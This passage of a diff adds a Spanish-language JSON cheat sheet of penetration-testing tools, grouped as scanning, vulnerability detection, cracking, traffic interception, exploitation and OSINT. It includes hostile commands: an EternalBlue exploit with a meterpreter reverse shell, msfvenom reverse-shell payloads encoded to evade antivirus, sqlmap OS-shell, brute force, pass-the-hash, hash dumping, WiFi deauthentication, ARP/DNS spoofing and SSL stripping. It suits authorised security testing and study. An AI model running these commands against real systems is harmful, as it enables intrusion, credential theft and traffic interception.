@@ -1,0 +1,1351 @@
+[
+  {
+    "category": "Escaneo y Enumeración",
+    "name": "Nmap",
+    "description": "Escáner de red para descubrir hosts y servicios en una red de computadoras.",
+    "commands": [
+      {
+        "type": "Básico",
+        "cmd": "nmap target",
+        "description": "Escaneo básico de los 1000 puertos más comunes."
+      },
+      {
+        "type": "Escaneo de puertos específicos",
+        "cmd": "nmap -p 80,443,22 target",
+        "description": "Escanea puertos específicos."
+      },
+      {
+        "type": "Escaneo completo",
+        "cmd": "nmap -p- target",
+        "description": "Escanea todos los 65535 puertos."
+      },
+      {
+        "type": "Detección de servicios",
+        "cmd": "nmap -sV target",
+        "description": "Detecta versiones de servicios en puertos abiertos."
+      },
+      {
+        "type": "Detección de SO",
+        "cmd": "nmap -O target",
+        "description": "Intenta detectar el sistema operativo."
+      },
+      {
+        "type": "Escaneo agresivo",
+        "cmd": "nmap -A target",
+        "description": "Combina detección de SO, versiones, scripts y traceroute."
+      },
+      {
+        "type": "Escaneo sigiloso",
+        "cmd": "nmap -sS target",
+        "description": "Escaneo SYN sigiloso (requiere privilegios root)."
+      },
+      {
+        "type": "Escaneo UDP",
+        "cmd": "nmap -sU target",
+        "description": "Escaneo de puertos UDP."
+      }
+    ]
+  },
+  {
+    "category": "Escaneo y Enumeración",
+    "name": "Gobuster",
+    "description": "Herramienta de fuerza bruta para descubrir directorios, archivos y subdominios.",
+    "commands": [
+      {
+        "type": "Fuerza bruta de directorios",
+        "cmd": "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt",
+        "description": "Busca directorios y archivos ocultos."
+      },
+      {
+        "type": "Fuerza bruta de subdominios",
+        "cmd": "gobuster dns -d domain -w /usr/share/wordlists/subdomains.txt",
+        "description": "Enumera subdominios."
+      },
+      {
+        "type": "Buscar archivos específicos",
+        "cmd": "gobuster dir -u http://target -w wordlist.txt -x php,html,txt",
+        "description": "Busca archivos con extensiones específicas."
+      },
+      {
+        "type": "Con cookies",
+        "cmd": "gobuster dir -u http://target -w wordlist.txt -c 'session=abc123'",
+        "description": "Incluye cookies en las peticiones."
+      }
+    ]
+  },
+  
+  {
+    "category": "Escaneo y Enumeración",
+    "name": "WhatWeb",
+    "description": "Herramienta para identificar tecnologías utilizadas por sitios web.",
+    "commands": [
+      {
+        "type": "Análisis básico",
+        "cmd": "whatweb url",
+        "description": "Escanea el sitio web e identifica tecnologías usadas."
+      },
+      {
+        "type": "Modo agresivo",
+        "cmd": "whatweb -v -a 3 url",
+        "description": "Ejecuta un escaneo detallado en modo agresivo."
+      },
+      {
+        "type": "Guardar salida",
+        "cmd": "whatweb -a 3 -o report.txt url",
+        "description": "Guarda los resultados del escaneo en un archivo."
+      }
+    ]
+  },
+   {
+    "category": "Escaneo y Enumeración",
+    "name": "dig",
+    "description": "Herramienta para realizar consultas DNS.",
+    "commands": [
+      {
+        "type": "Consulta A",
+        "cmd": "dig domain",
+        "description": "Obtiene la dirección IP del dominio (registro A)."
+      },
+      {
+        "type": "Consulta MX",
+        "cmd": "dig domain MX",
+        "description": "Obtiene los registros de correo (MX) del dominio."
+      },
+      {
+        "type": "Consulta NS",
+        "cmd": "dig domain NS",
+        "description": "Obtiene los servidores de nombres (NS) del dominio."
+      }
+    ]
+  },
+  {
+    "category": "Escaneo y Enumeración",
+    "name": "whois",
+    "description": "Herramienta para obtener información de registro de dominios.",
+    "commands": [
+      {
+        "type": "Consulta básica",
+        "cmd": "whois domain",
+        "description": "Muestra la información de registro del dominio."
+      },
+      {
+        "type": "Consulta con IP",
+        "cmd": "whois ip",
+        "description": "Muestra información de una dirección IP pública."
+      }
+    ]
+  },
+  {
+    "category": "Escaneo y Enumeración",
+    "name": "nslookup",
+    "description": "Herramienta para realizar consultas DNS de forma interactiva o directa.",
+    "commands": [
+      {
+        "type": "Consulta directa",
+        "cmd": "nslookup domain",
+        "description": "Obtiene la dirección IP del dominio."
+      },
+      {
+        "type": "Consulta a servidor específico",
+        "cmd": "nslookup domain <dns_server>",
+        "description": "Consulta el dominio usando un servidor DNS específico."
+      },
+      {
+        "type": "Modo interactivo",
+        "cmd": "nslookup set type=MX domain",
+        "description": "Modo interactivo para consultar registros específicos como MX, NS, etc."
+      }
+    ]
+  },
+
+  {
+    "category": "Detección de Vulnerabilidades",
+    "name": "Nikto",
+    "description": "Escáner de vulnerabilidades web que identifica problemas de seguridad en servidores web.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "nikto -h target",
+        "description": "Escaneo básico de vulnerabilidades web."
+      },
+      {
+        "type": "Escaneo con puerto específico",
+        "cmd": "nikto -h target -p 80,443",
+        "description": "Escanea puertos específicos."
+      },
+      {
+        "type": "Escaneo con SSL",
+        "cmd": "nikto -h https://target",
+        "description": "Escaneo de sitio web con SSL/TLS."
+      },
+      {
+        "type": "Guardar resultados",
+        "cmd": "nikto -h target -o results.txt",
+        "description": "Guarda los resultados en un archivo."
+      },
+      {
+        "type": "Escaneo con evasión",
+        "cmd": "nikto -h target -evasion 1",
+        "description": "Usa técnicas de evasión para evitar detección."
+      }
+    ]
+  },
+  {
+    "category": "Detección de Vulnerabilidades",
+    "name": "httpx",
+    "description": "Escáner HTTP rápido que identifica servicios web activos, tecnologías usadas y expone información sensible.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "echo 'https://target.com' | httpx -silent",
+        "description": "Verifica si un dominio está activo."
+      },
+      {
+        "type": "Detección de tecnologías",
+        "cmd": "httpx -u https://target.com -tech-detect",
+        "description": "Identifica tecnologías (CMS, frameworks, servidores) usadas en el objetivo."
+      },
+      {
+        "type": "Filtrar por código de estado",
+        "cmd": "cat targets.txt | httpx -status-code -mc 200,403",
+        "description": "Filtra URLs basándose en códigos de estado HTTP específicos."
+      },
+      {
+        "type": "Extraer títulos y headers",
+        "cmd": "httpx -u https://target.com -title -location -web-server",
+        "description": "Muestra el título, redirecciones y servidor web del objetivo."
+      },
+      {
+        "type": "Escaneo con puertos personalizados",
+        "cmd": "httpx -u http://target.com -ports 80,443,8080",
+        "description": "Escanea puertos no estándar."
+      }
+    ]
+  },
+
+  {
+    "category": "Detección de Vulnerabilidades",
+    "name": "nuclei",
+    "description": "Herramienta de escaneo basada en plantillas para identificar vulnerabilidades conocidas (CVEs, exposiciones de datos, configuraciones inseguras).",
+    "commands": [
+      {
+        "type": "Escaneo básico con plantillas",
+        "cmd": "nuclei -u https://target.com -t cves/",
+        "description": "Busca vulnerabilidades usando plantillas de CVEs."
+      },
+      {
+        "type": "Escaneo con severidad crítica",
+        "cmd": "nuclei -u https://target.com -severity critical,high",
+        "description": "Filtra resultados por nivel de riesgo."
+      },
+      {
+        "type": "Uso de plantillas personalizadas",
+        "cmd": "nuclei -u https://target.com -t /ruta/mis-plantillas.yaml",
+        "description": "Ejecuta plantillas personalizadas en formato YAML."
+      },
+      {
+        "type": "Escaneo masivo (lista de targets)",
+        "cmd": "nuclei -l targets.txt -t exposures/configs/",
+        "description": "Escanea múltiples objetivos en busca de configuraciones expuestas."
+      },
+      {
+        "type": "Guardar resultados en JSON",
+        "cmd": "nuclei -u https://target.com -json -o results.json",
+        "description": "Exporta resultados en formato JSON."
+      }
+    ]
+  },
+  {
+    "category": "Detección de Vulnerabilidades",
+    "name": "WPScan",
+    "description": "Escáner de seguridad específico para sitios web WordPress.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "wpscan --url target",
+        "description": "Escaneo básico de WordPress."
+      },
+      {
+        "type": "Enumerar usuarios",
+        "cmd": "wpscan --url target --enumerate u",
+        "description": "Enumera usuarios de WordPress."
+      },
+      {
+        "type": "Enumerar plugins",
+        "cmd": "wpscan --url target --enumerate p",
+        "description": "Enumera plugins instalados."
+      },
+      {
+        "type": "Enumerar temas",
+        "cmd": "wpscan --url target --enumerate t",
+        "description": "Enumera temas instalados."
+      },
+      {
+        "type": "Escaneo agresivo",
+        "cmd": "wpscan --url target --enumerate u,p,t --plugins-detection aggressive",
+        "description": "Escaneo agresivo completo."
+      }
+    ]
+  },
+
+  {
+    "category": "Detección de Vulnerabilidades",
+    "name": "joomscan",
+    "description": "Escáner especializado en Joomla que detecta versiones vulnerables, plugins inseguros y configuraciones erróneas.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "joomscan -u https://target.com",
+        "description": "Escaneo estándar de un sitio Joomla."
+      },
+      {
+        "type": "Fuerza bruta a componentes",
+        "cmd": "joomscan -u https://target.com --enumerate-components",
+        "description": "Enumera componentes/extensions instalados."
+      },
+      {
+        "type": "Detección de vulnerabilidades conocidas",
+        "cmd": "joomscan -u https://target.com --vulnerable",
+        "description": "Busca CVEs asociados a la versión de Joomla."
+      },
+      {
+        "type": "Guardar resultados",
+        "cmd": "joomscan -u https://target.com -o report.html",
+        "description": "Exporta resultados a un archivo HTML."
+      },
+      {
+        "type": "Escaneo agresivo",
+        "cmd": "joomscan -u https://target.com --aggressive",
+        "description": "Activa pruebas intrusivas (ej: inyecciones)."
+      }
+    ]
+  },
+
+  {
+    "category": "Fuerza Bruta y Cracking",
+    "name": "Hydra",
+    "description": "Herramienta de fuerza bruta para múltiples protocolos de red.",
+    "commands": [
+      {
+        "type": "SSH",
+        "cmd": "hydra -l user -P passwords.txt ssh://target",
+        "description": "Ataque de fuerza bruta contra SSH."
+      },
+      {
+        "type": "FTP",
+        "cmd": "hydra -L users.txt -P passwords.txt ftp://target",
+        "description": "Ataque de fuerza bruta contra FTP."
+      },
+      {
+        "type": "HTTP POST",
+        "cmd": "hydra -l admin -P passwords.txt target http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
+        "description": "Ataque contra formulario de login HTTP."
+      },
+      {
+        "type": "SMB",
+        "cmd": "hydra -L users.txt -P passwords.txt smb://target",
+        "description": "Ataque de fuerza bruta contra SMB."
+      },
+      {
+        "type": "RDP",
+        "cmd": "hydra -L users.txt -P passwords.txt rdp://target",
+        "description": "Ataque de fuerza bruta contra RDP."
+      }
+    ]
+  },
+  {
+    "category": "Fuerza Bruta y Cracking",
+    "name": "John the Ripper",
+    "description": "Herramienta de cracking de contraseñas y hashes.",
+    "commands": [
+      {
+        "type": "Cracking básico",
+        "cmd": "john hashes.txt",
+        "description": "Crack de hashes con diccionario por defecto."
+      },
+      {
+        "type": "Con diccionario personalizado",
+        "cmd": "john --wordlist=passwords.txt hashes.txt",
+        "description": "Usa un diccionario personalizado."
+      },
+      {
+        "type": "Fuerza bruta",
+        "cmd": "john --incremental hashes.txt",
+        "description": "Ataque de fuerza bruta incremental."
+      },
+      {
+        "type": "Mostrar contraseñas crackeadas",
+        "cmd": "john --show hashes.txt",
+        "description": "Muestra las contraseñas ya crackeadas."
+      },
+      {
+        "type": "Formato específico",
+        "cmd": "john --format=md5 hashes.txt",
+        "description": "Especifica el formato del hash."
+      }
+    ]
+  },
+  {
+    "category": "Fuerza Bruta y Cracking",
+    "name": "Hashcat",
+    "description": "Herramienta avanzada de cracking de contraseñas con aceleración GPU.",
+    "commands": [
+      {
+        "type": "MD5",
+        "cmd": "hashcat -m 0 hashes.txt wordlist.txt",
+        "description": "Crack de hashes MD5."
+      },
+      {
+        "type": "SHA-256",
+        "cmd": "hashcat -m 1400 hashes.txt wordlist.txt",
+        "description": "Crack de hashes SHA-256."
+      },
+      {
+        "type": "NTLM",
+        "cmd": "hashcat -m 1000 hashes.txt wordlist.txt",
+        "description": "Crack de hashes NTLM."
+      },
+      {
+        "type": "Con reglas",
+        "cmd": "hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule",
+        "description": "Aplica reglas de mutación al diccionario."
+      }
+    ]
+  },
+  {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "Wireshark",
+    "description": "Analizador de protocolos de red para captura y análisis de tráfico.",
+    "commands": [
+      {
+        "type": "Captura en interfaz",
+        "cmd": "wireshark -i eth0",
+        "description": "Inicia captura en interfaz específica."
+      },
+      {
+        "type": "Captura en modo línea de comandos",
+        "cmd": "tshark -i eth0 -w capture.pcap",
+        "description": "Captura tráfico y guarda en archivo."
+      },
+      {
+        "type": "Filtro por protocolo",
+        "cmd": "tshark -i eth0 -f 'tcp port 80'",
+        "description": "Captura solo tráfico HTTP."
+      },
+      {
+        "type": "Análisis de archivo",
+        "cmd": "tshark -r capture.pcap",
+        "description": "Analiza archivo de captura existente."
+      }
+    ]
+  },
+
+  {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "Aircrack-ng",
+    "description": "Suite de herramientas para auditoría de redes inalámbricas, incluyendo cracking de contraseñas WEP/WPA/WPA2.",
+    "commands": [
+      {
+        "type": "Escaneo de redes WiFi",
+        "cmd": "airmon-ng start wlan0 && airodump-ng wlan0mon",
+        "description": "Pone la interfaz en modo monitor y lista redes disponibles."
+      },
+      {
+        "type": "Captura de handshake WPA",
+        "cmd": "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
+        "description": "Captura paquetes de un AP específico para obtener handshake."
+      },
+      {
+        "type": "Ataque de deautenticación",
+        "cmd": "aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon",
+        "description": "Fuerza la reconexión de clientes para capturar handshake."
+      },
+      {
+        "type": "Cracking de contraseña WPA",
+        "cmd": "aircrack-ng -w rockyou.txt capture-01.cap",
+        "description": "Intenta crackear la contraseña con un diccionario."
+      }
+    ]
+  },
+  {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "tcpdump",
+    "description": "Herramienta de línea de comandos para capturar y analizar tráfico de red.",
+    "commands": [
+      {
+        "type": "Captura básica",
+        "cmd": "tcpdump -i eth0",
+        "description": "Captura todo el tráfico en una interfaz."
+      },
+      {
+        "type": "Captura con filtro de IP",
+        "cmd": "tcpdump -i eth0 host 192.168.1.100",
+        "description": "Captura tráfico de/para una IP específica."
+      },
+      {
+        "type": "Captura de tráfico HTTP",
+        "cmd": "tcpdump -i eth0 port 80 -A",
+        "description": "Captura y muestra tráfico HTTP en texto legible."
+      },
+      {
+        "type": "Guardar captura en archivo",
+        "cmd": "tcpdump -i eth0 -w capture.pcap",
+        "description": "Guarda el tráfico capturado en un archivo PCAP."
+      }
+    ]
+  },
+
+{
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "Bettercap",
+    "description": "Framework completo para ataques MITM, sniffing de red y manipulación de tráfico en tiempo real.",
+    "commands": [
+      {
+        "type": "Sniffing básico",
+        "cmd": "bettercap -iface eth0",
+        "description": "Inicia sniffing en una interfaz específica."
+      },
+      {
+        "type": "ARP Spoofing",
+        "cmd": "bettercap -iface eth0 --sniffer --proxy",
+        "description": "Realiza ARP spoofing y activa módulos de sniffing/proxy."
+      },
+      {
+        "type": "Ataque a red WiFi",
+        "cmd": "bettercap -iface wlan0 -eval \"wifi.recon on; wifi.show\"",
+        "description": "Escanea y muestra redes WiFi disponibles."
+      },
+      {
+        "type": "Interceptar tráfico HTTPS",
+        "cmd": "bettercap -iface eth0 --proxy --proxy-https",
+        "description": "Activa proxy HTTPS para interceptar tráfico cifrado."
+      }
+    ]
+  },
+
+  {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "Ettercap",
+    "description": "Herramienta para ataques MITM (Man-in-the-Middle), incluyendo ARP spoofing, sniffing y filtrado de tráfico.",
+    "commands": [
+      {
+        "type": "ARP Spoofing básico",
+        "cmd": "ettercap -T -i eth0 -M arp /192.168.1.1// /192.168.1.100//",
+        "description": "Realiza ARP spoofing entre un router y un cliente."
+      },
+      {
+        "type": "Sniffing de credenciales",
+        "cmd": "ettercap -T -i eth0 -M arp -q -l captura",
+        "description": "Captura credenciales en texto claro (HTTP, FTP, etc.)."
+      },
+      {
+        "type": "Ataque con filtro personalizado",
+        "cmd": "ettercap -T -i eth0 -F filtro.ef -M arp",
+        "description": "Aplica un filtro personalizado para manipular tráfico."
+      },
+      {
+        "type": "Intercepción de DNS",
+        "cmd": "ettercap -T -i eth0 -P dns_spoof -M arp",
+        "description": "Realiza envenenamiento DNS para redirigir tráfico."
+      }
+    ]
+  },
+  {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "Driftnet",
+    "description": "Herramienta para capturar y mostrar imágenes transmitidas en tráfico de red (HTTP, FTP, etc.).",
+    "commands": [
+      {
+        "type": "Captura básica de imágenes",
+        "cmd": "driftnet -i eth0",
+        "description": "Abre una ventana mostrando imágenes capturadas en tiempo real."
+      },
+      {
+        "type": "Guardar imágenes capturadas",
+        "cmd": "driftnet -i eth0 -d /ruta/capturas",
+        "description": "Guarda imágenes en un directorio específico."
+      },
+      {
+        "type": "Filtrar por dirección IP",
+        "cmd": "driftnet -i eth0 -a -f 'host 192.168.1.100'",
+        "description": "Captura imágenes solo de un host específico."
+      },
+      {
+        "type": "Modo silencioso (solo guardar)",
+        "cmd": "driftnet -i eth0 -d /ruta/capturas -m 0",
+        "description": "Guarda imágenes sin mostrarlas en pantalla."
+      }
+    ]
+  },
+
+ {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "SSLstrip",
+    "description": "Herramienta para degradar conexiones HTTPS a HTTP y capturar tráfico sensible (credenciales, cookies).",
+    "commands": [
+      {
+        "type": "Configuración básica con iptables",
+        "cmd": "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 && sslstrip -l 8080",
+        "description": "Redirige tráfico HTTP al puerto de SSLstrip para interceptar."
+      },
+      {
+        "type": "Guardar tráfico capturado",
+        "cmd": "sslstrip -l 8080 -w captura.log",
+        "description": "Almacena datos interceptados en un archivo."
+      },
+      {
+        "type": "Uso con ARP spoofing",
+        "cmd": "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 && sslstrip -l 8080",
+        "description": "Combina ARP spoofing con SSLstrip para MITM."
+      },
+      {
+        "type": "Filtrar por dominio",
+        "cmd": "sslstrip -l 8080 -f -k facebook.com",
+        "description": "Intercepta solo tráfico dirigido a un dominio específico."
+      }
+    ]
+  },
+  {
+    "category": "Intercepción y Manipulación de Tráfico",
+    "name": "Mitmproxy",
+    "description": "Proxy interactivo para analizar, modificar y redirigir tráfico HTTP/HTTPS en tiempo real.",
+    "commands": [
+      {
+        "type": "Proxy básico",
+        "cmd": "mitmproxy -p 8080",
+        "description": "Inicia un proxy en el puerto 8080 para inspeccionar tráfico."
+      },
+      {
+        "type": "Modo transparente (ARP spoofing)",
+        "cmd": "mitmproxy -T --host",
+        "description": "Combina con ARP spoofing para interceptar tráfico sin configurar proxy en el cliente."
+      },
+      {
+        "type": "Guardar sesiones",
+        "cmd": "mitmproxy -w flujo.mitm",
+        "description": "Almacena el tráfico capturado para análisis posterior."
+      },
+      {
+        "type": "Filtrar por URL",
+        "cmd": "mitmproxy -p 8080 -s '~u example.com'",
+        "description": "Intercepta solo solicitudes a un dominio específico."
+      }
+    ]
+  },  
+
+{
+    "category": "Explotación",
+    "name": "Metasploit",
+    "description": "Framework de explotación y desarrollo de exploits.",
+    "commands": [
+      {
+        "type": "Iniciar consola",
+        "cmd": "msfconsole",
+        "description": "Inicia la consola de Metasploit."
+      },
+      {
+        "type": "Buscar exploits",
+        "cmd": "search service",
+        "description": "Busca exploits para un servicio específico."
+      },
+      {
+        "type": "Usar exploit",
+        "cmd": "use exploit/windows/smb/ms17_010_eternalblue",
+        "description": "Selecciona un exploit específico."
+      },
+      {
+        "type": "Configurar target",
+        "cmd": "set RHOSTS target",
+        "description": "Establece el objetivo del exploit."
+      },
+      {
+        "type": "Configurar payload",
+        "cmd": "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "description": "Selecciona el payload a usar."
+      },
+      {
+        "type": "Ejecutar exploit",
+        "cmd": "exploit",
+        "description": "Ejecuta el exploit configurado."
+      }
+    ]
+  },
+  {
+    "category": "Explotación",
+    "name": "sqlmap",
+    "description": "Herramienta automatizada para detección y explotación de inyecciones SQL.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "sqlmap -u 'http://target.com/page?id=1'",
+        "description": "Detecta vulnerabilidades SQLi en un parámetro."
+      },
+      {
+        "type": "Extraer bases de datos",
+        "cmd": "sqlmap -u 'http://target.com/page?id=1' --dbs",
+        "description": "Enumera las bases de datos disponibles."
+      },
+      {
+        "type": "Extraer tablas",
+        "cmd": "sqlmap -u 'http://target.com/page?id=1' -D dbname --tables",
+        "description": "Enumera tablas de una base de datos específica."
+      },
+      {
+        "type": "Dumpear datos",
+        "cmd": "sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump",
+        "description": "Extrae el contenido de una tabla."
+      },
+      {
+        "type": "Ejecutar comandos OS",
+        "cmd": "sqlmap -u 'http://target.com/page?id=1' --os-shell",
+        "description": "Intenta obtener una shell en el sistema."
+      }
+    ]
+  },
+  {
+    "category": "Explotación",
+    "name": "XSStrike",
+    "description": "Herramienta avanzada para detección y explotación de vulnerabilidades XSS.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "python3 xsstrike.py -u 'http://target.com/search?q=test'",
+        "description": "Busca vulnerabilidades XSS en un parámetro."
+      },
+      {
+        "type": "Modo crawler",
+        "cmd": "python3 xsstrike.py -u 'http://target.com' --crawl",
+        "description": "Analiza todo el sitio en busca de XSS."
+      },
+      {
+        "type": "Fuzzing avanzado",
+        "cmd": "python3 xsstrike.py -u 'http://target.com/search?q=test' --fuzzer",
+        "description": "Prueba múltiples vectores de XSS."
+      },
+      {
+        "type": "Explotación",
+        "cmd": "python3 xsstrike.py -u 'http://target.com/search?q=test' --exploit",
+        "description": "Intenta explotar XSS detectados."
+      }
+    ]
+  },
+  {
+    "category": "Explotación",
+    "name": "MSFvenom",
+    "description": "Generador de payloads para Metasploit.",
+    "commands": [
+      {
+        "type": "Generar payload Windows",
+        "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe",
+        "description": "Crea un payload para Windows."
+      },
+      {
+        "type": "Generar payload Linux",
+        "cmd": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o payload.elf",
+        "description": "Crea un payload para Linux."
+      },
+      {
+        "type": "Generar payload Android",
+        "cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -o payload.apk",
+        "description": "Crea un payload para Android."
+      },
+      {
+        "type": "Encodear payload",
+        "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe",
+        "description": "Ofusca el payload para evadir AV."
+      }
+    ]
+  },
+  {
+    "category": "Explotación",
+    "name": "smbclient",
+    "description": "Cliente para interactuar con recursos compartidos SMB.",
+    "commands": [
+      {
+        "type": "Listar recursos",
+        "cmd": "smbclient -L //target -U 'username%password'",
+        "description": "Enumera recursos compartidos en un servidor SMB."
+      },
+      {
+        "type": "Conectarse a recurso",
+        "cmd": "smbclient //target/share -U 'username%password'",
+        "description": "Accede a un recurso compartido específico."
+      },
+      {
+        "type": "Descargar archivo",
+        "cmd": "smbclient //target/share -U 'username%password' -c 'get file.txt'",
+        "description": "Descarga un archivo del recurso compartido."
+      },
+      {
+        "type": "Subir archivo",
+        "cmd": "smbclient //target/share -U 'username%password' -c 'put file.txt'",
+        "description": "Sube un archivo al recurso compartido."
+      }
+    ]
+  },
+  {
+    "category": "Explotación",
+    "name": "Impacket",
+    "description": "Colección de scripts para explotar protocolos de red (SMB, MSSQL, LDAP, etc.).",
+    "commands": [
+      {
+        "type": "Extraer hashes NTLM",
+        "cmd": "python3 secretsdump.py DOMAIN/user:password@target",
+        "description": "Dumpea hashes de un servidor Windows."
+      },
+      {
+        "type": "Ejecución remota de comandos",
+        "cmd": "python3 psexec.py DOMAIN/user:password@target",
+        "description": "Ejecuta comandos en un sistema remoto (similar a PsExec)."
+      },
+      {
+        "type": "Ataque Pass-the-Hash",
+        "cmd": "python3 wmiexec.py -hashes :<NTLMhash> DOMAIN/user@target",
+        "description": "Autenticación sin contraseña usando hashes NTLM."
+      },
+      {
+        "type": "Escalada de privilegios",
+        "cmd": "python3 getTGT.py -dc-ip <DC_IP> DOMAIN/user -hashes :<NTLMhash>",
+        "description": "Genera tickets Kerberos para movimiento lateral."
+      }
+    ]
+  },
+  {
+    "category": "Explotación",
+    "name": "CrackMapExec",
+    "description": "Herramienta para auditoría de redes Windows/Active Directory.",
+    "commands": [
+      {
+        "type": "Escaneo de red",
+        "cmd": "crackmapexec smb [IP]/24",
+        "description": "Enumera hosts SMB en una red."
+      },
+      {
+        "type": "Spray de contraseñas",
+        "cmd": "crackmapexec smb [IP] -u usuarios.txt -p contraseñas.txt",
+        "description": "Prueba múltiples credenciales."
+      },
+      {
+        "type": "Pass-the-Hash",
+        "cmd": "crackmapexec smb [IP] -u usuario -H [NTLMhash]",
+        "description": "Autenticación con hash NTLM."
+      },
+      {
+        "type": "Ejecución de comandos",
+        "cmd": "crackmapexec smb [IP] -u usuario -p contraseña -x 'whoami'",
+        "description": "Ejecuta comandos en hosts comprometidos."
+      }
+    ]
+  },
+
+  {
+    "category": "OSINT",
+    "name": "Shodan",
+    "description": "Motor de búsqueda para dispositivos conectados a Internet.",
+    "commands": [
+      {
+        "type": "Búsqueda básica",
+        "cmd": "shodan search apache",
+        "description": "Busca servidores Apache expuestos."
+      },
+      {
+        "type": "Búsqueda por país",
+        "cmd": "shodan search apache country:US",
+        "description": "Busca servidores Apache en Estados Unidos."
+      },
+      {
+        "type": "Información de host",
+        "cmd": "shodan host <IP>",
+        "description": "Obtiene información detallada de una IP."
+      },
+      {
+        "type": "Búsqueda por puerto",
+        "cmd": "shodan search port:22",
+        "description": "Busca dispositivos con puerto 22 abierto."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "Maltego",
+    "description": "Herramienta de análisis de enlaces y minería de datos para OSINT.",
+    "commands": [
+      {
+        "type": "Iniciar Maltego",
+        "cmd": "maltego",
+        "description": "Inicia la aplicación Maltego."
+      },
+      {
+        "type": "Transformaciones básicas",
+        "cmd": "Usar transformaciones para enumerar subdominios",
+        "description": "Aplica transformaciones automáticas."
+      }
+    ]
+  },
+
+  {
+    "category": "OSINT",
+    "name": "theHarvester",
+    "description": "Herramienta para recopilar información de fuentes públicas (OSINT).",
+    "commands": [
+      {
+        "type": "Búsqueda básica",
+        "cmd": "theHarvester -d domain -b google",
+        "description": "Busca emails y subdominios en Google."
+      },
+      {
+        "type": "Múltiples fuentes",
+        "cmd": "theHarvester -d domain -b google,bing,yahoo",
+        "description": "Busca en múltiples motores de búsqueda."
+      },
+      {
+        "type": "Guardar resultados",
+        "cmd": "theHarvester -d domain -b all -f results.html",
+        "description": "Guarda los resultados en un archivo HTML."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "Recon-ng",
+    "description": "Framework completo para reconocimiento e inteligencia de fuentes abiertas (OSINT).",
+    "commands": [
+      {
+        "type": "Iniciar consola",
+        "cmd": "recon-ng",
+        "description": "Inicia la interfaz interactiva de Recon-ng."
+      },
+      {
+        "type": "Cargar módulo",
+        "cmd": "marketplace install recon/domains-hosts/hackertarget",
+        "description": "Instala y carga un módulo específico."
+      },
+      {
+        "type": "Configurar dominio objetivo",
+        "cmd": "options set SOURCE example.com",
+        "description": "Establece el dominio objetivo para la investigación."
+      },
+      {
+        "type": "Ejecutar módulo",
+        "cmd": "run",
+        "description": "Ejecuta el módulo cargado actualmente."
+      },
+      {
+        "type": "Mostrar resultados",
+        "cmd": "show hosts",
+        "description": "Muestra los hosts/subdominios encontrados."
+      },
+      {
+        "type": "Exportar datos",
+        "cmd": "export hosts /path/to/results.json",
+        "description": "Exporta los resultados a un archivo."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "Subfinder",
+    "description": "Herramienta para descubrimiento pasivo de subdominios.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "subfinder -d example.com",
+        "description": "Busca subdominios del dominio objetivo."
+      },
+      {
+        "type": "Usar múltiples fuentes",
+        "cmd": "subfinder -d example.com -all",
+        "description": "Utiliza todas las fuentes disponibles para maximizar resultados."
+      },
+      {
+        "type": "Guardar resultados",
+        "cmd": "subfinder -d example.com -o subdomains.txt",
+        "description": "Guarda los subdominios encontrados en un archivo."
+      },
+      {
+        "type": "Combinar con otras herramientas",
+        "cmd": "subfinder -d example.com | httpx -silent",
+        "description": "Filtra subdominios activos usando httpx."
+      },
+      {
+        "type": "Configurar API keys",
+        "cmd": "subfinder -d example.com -config config.yaml",
+        "description": "Usa un archivo de configuración con claves API para mejores resultados."
+      }
+    ]
+  },
+
+{
+    "category": "OSINT",
+    "name": "ExifTool",
+    "description": "Herramienta para leer, escribir y editar metadatos en archivos (imágenes, documentos, etc.).",
+    "commands": [
+      {
+        "type": "Leer metadatos básicos",
+        "cmd": "exiftool imagen.jpg",
+        "description": "Muestra todos los metadatos de un archivo."
+      },
+      {
+        "type": "Extraer GPS coordinates",
+        "cmd": "exiftool -GPSPosition -n imagen.jpg",
+        "description": "Extrae coordenadas GPS (si existen)."
+      },
+      {
+        "type": "Borrar metadatos",
+        "cmd": "exiftool -all= imagen.jpg",
+        "description": "Elimina todos los metadatos de un archivo."
+      },
+      {
+        "type": "Escaneo recursivo",
+        "cmd": "exiftool -r -gps -csv /ruta/carpeta > resultados.csv",
+        "description": "Busca metadatos GPS en todos los archivos de una carpeta y exporta a CSV."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "Metagoofil",
+    "description": "Herramienta para extraer metadatos de documentos públicos en Google (PDF, DOCX, PPT, etc.).",
+    "commands": [
+      {
+        "type": "Búsqueda básica",
+        "cmd": "metagoofil -d example.com -t pdf,docx -l 20 -n 5 -o /ruta/descargas",
